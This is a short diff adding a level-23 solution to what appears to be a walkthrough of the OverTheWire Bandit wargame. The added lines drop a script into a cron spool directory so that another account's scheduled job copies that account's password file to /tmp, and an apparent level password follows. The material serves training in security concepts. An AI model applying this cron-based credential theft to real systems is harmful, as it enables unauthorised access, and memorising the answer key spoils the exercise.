@@ -153,3 +153,11 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
 
 ### bandit 23
+```sh
+echo "cat /etc/bandit_pass/bandit24 > /tmp/bandit23/bandit24.txt" > /var/spool/bandit24/foo/bandit23.sh
+chmod o+x /var/spool/bandit24/foo/bandit23.sh
+```
+
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+### bandit 25
